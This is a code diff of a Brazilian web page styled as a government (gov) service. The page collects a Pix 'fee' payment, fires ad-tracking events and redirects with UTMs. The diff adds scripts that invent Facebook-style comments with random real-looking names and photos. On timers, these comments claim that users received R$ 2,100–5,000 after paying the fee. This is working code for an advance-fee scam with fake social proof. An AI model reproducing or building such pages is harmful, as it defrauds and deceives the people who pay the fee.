-    // 1. Tela Verde instantânea
-    var areaPix = document.getElementById('pix-body-container');
-    if(areaPix) {
-        areaPix.innerHTML = `
-          <div style="text-align:center; padding: 40px 20px;">
-            <i class="fas fa-check-circle" style="font-size: 64px; color: var(--gov-green); margin-bottom: 16px;"></i>
-            <h3 style="color: var(--gov-blue-dark); margin-bottom: 8px;">Pagamento Confirmado!</h3>
-            <p style="color: var(--gov-gray-dark); font-size: 14px; margin-bottom: 24px;">Processando seu acesso, por favor aguarde...</p>
-            <div class="pix-spin" style="margin: 0 auto; width: 35px; height: 35px; border-width: 3px; border-top-color: var(--gov-green);"></div>
-          </div>
-        `;
+    function generateInitialComments() {
+        const texts = ["Tive medo, mas entrou R$ 2.400!", "Tive que pagar taxa, mas veio R$ 2.800 em 10min", "Recebi R$ 4.000 deu para pagar as contas kkk"];
+        texts.forEach(text => createRandomComment(text, true));
+        fbCountSpan.textContent = `Comentários: ${totalComments}`;
+        fbLoadingSpan.textContent = "Comentários atualizados.";
+        scheduleComments();
     }
 
-    pixLimparCache();
-    ttqPurchase();
-    
-    // 2. Dispara pra UTMify garantindo a captura do evento
-    await utmifyNotificar('paid');
-    
-    // 3. Aguarda 1,5 segundos de margem de segurança e redireciona com UTMs como a Mangofy instruiu
-    setTimeout(function() {
-        window.location.href = utmRedirectUrl();
-    }, 1500);
-  };
+    function scheduleComments() {
+        const messages = [
+            "Alguém conseguiu R$ 2.700 hoje?",
+            "Meu Pix foi aprovado e caiu R$ 3.500 em 5 min!",
+            "Testei hoje e entrou R$ 2.100 rapidinho!",
+            "Show! Liberou R$ 4.250 e já usei tudo!",
+            "Recebi R$ 5.000, só precisei pagar a taxa",
+            "O meu acabou de cair, valeu galera!",
+            "Alguem de SP ja recebeu?",
+            "Acabei de fazer o pagamento da taxa, aguardando..."
+        ];
+        messages.forEach((msg, i) => {
+            setTimeout(() => {
+                fbLoadingSpan.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Carregando comentários`;
+                createRandomComment(msg, false);
+                fbLoadingSpan.textContent = "Comentários atualizados.";
+                fbHeaderOutside.textContent = `Comentários (${++totalComments})`;
+            }, (i + 1) * 10000); 
+        });
+    }
 
-  function pixAba(aba){
-    document.getElementById('ptab-copia').classList.toggle('on',aba==='copia');
-    document.getElementById('ptab-qr').classList.toggle('on',aba==='qr');
-    document.getElementById('ppane-copia').classList.toggle('on',aba==='copia');
-    document.getElementById('ppane-qr').classList.toggle('on',aba==='qr');
-  }
-  function pixCopiar(){
-    if(!_pixCode)return;
-    var btn=document.getElementById('pix-copy-btn');var orig=btn.innerHTML;
-    ttqAddPaymentInfo();
-    function ok(){btn.innerHTML='<i class="fas fa-check"></i><span>CÓDIGO COPIADO!</span>';btn.classList.add('ok');setTimeout(function(){btn.innerHTML=orig;btn.classList.remove('ok');},3000);}
-    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(_pixCode).then(ok).catch(function(){_fbCopy();ok();});}else{_fbCopy();ok();}
-  }
-  function _fbCopy(){var el=document.createElement('textarea');el.value=_pixCode;el.style.cssText='position:fixed;opacity:0;top:0;left:0;';document.body.appendChild(el);el.focus();el.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(el);}
-  function pixToggle(hd){var bd=hd.nextElementSibling;var ic=hd.querySelector('i');ic.style.transform=bd.classList.toggle('open')?'rotate(0deg)':'rotate(180deg)';}
+    async function createRandomComment(text, initial) {
+        const userData = await getRandomUser();
+        createComment(userData.name.first, userData.picture.medium, text, Math.floor(Math.random()*10), 0, initial);
+        storedComments.unshift({ name: userData.name.first, avatar: userData.picture.medium, text, likes: 0, dislikes: 0 });
+        saveCommentsToLocal();
+    }
 
-  var totalComments=25738,storedComments=[];
-  function initFacebookComments(){
-    document.getElementById('fb-header-outside').textContent='Comentários ('+totalComments+')';
-    var local=localStorage.getItem('commentsData');
-    if(local){storedComments=JSON.parse(local);storedComments.forEach(function(c){createComment(c.name,c.avatar,c.text,c.likes,c.dislikes,false);});}
-    else{generateInitialComments();}
-  }
-  function generateInitialComments(){['Tive medo, mas entrou R$ 2.400!','Tive que pagar taxa, mas veio R$ 2.800 em 10min','Recebi R$ 4.000 deu para pagar as contas kkk'].forEach(function(t){createRandomComment(t,true);});}
-  async function createRandomComment(text,initial){totalComments++;var ud=await getRandomUser();createComment(ud.name.first,ud.picture.medium,text,0,0,initial);storedComments.unshift({name:ud.name.first,avatar:ud.picture.medium,text:text,likes:0,dislikes:0});}
-  function createComment(name,avatar,text,likes,dislikes,initialLoad){var el=document.createElement('div');el.classList.add('comment-item');el.innerHTML='<img class="comment-avatar" src="'+avatar+'"/><div class="comment-content"><div class="comment-name">'+name+'</div><div class="comment-text">'+text+'</div><div class="comment-actions"><span class="comment-likes"><i class="fas fa-thumbs-up"></i> '+likes+'</span></div></div>';var c=document.getElementById('fb-comments-container');c.insertBefore(el,c.firstChild);}
-  async function getRandomUser(){var r=await fetch('https://randomuser.me/api/?nat=br');return(await r.json()).results[0];}
-  initFacebookComments();
-  pixIniciar();
+    function createComment(name, avatar, text, likes, dislikes, initialLoad) {
+        const cItem = document.createElement('div');
+        cItem.classList.add('comment-item');
+        cItem.innerHTML = `
+            <img class="comment-avatar" src="${avatar}" alt="avatar"/>
+            <div class="comment-content">
+              <div class="comment-name">${name}</div>
+              <div class="comment-text">${text}</div>
+              <div class="comment-actions">
+                <span class="comment-likes"><i class="fas fa-thumbs-up"></i> ${likes}</span>
+                <span class="comment-dislikes"><i class="fas fa-thumbs-down"></i> ${dislikes}</span>
+              </div>
+            </div>`;
+        fbContainer.insertBefore(cItem, fbContainer.firstChild);
+    }
+
+    async function getRandomUser() {
+        const res = await fetch('https://randomuser.me/api/?nat=br');
+        const data = await res.json();
+        return data.results[0];
+    }
+
+    function saveCommentsToLocal() {
+        localStorage.setItem('commentsData', JSON.stringify(storedComments));
+    }
+
+    // Inicializar
+    initFacebookComments();
+    pixIniciar();
 </script>
 </body>
 </html>
